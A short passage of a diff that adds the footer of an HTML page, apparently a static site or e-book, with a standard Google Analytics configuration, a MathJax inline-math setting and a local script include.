+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
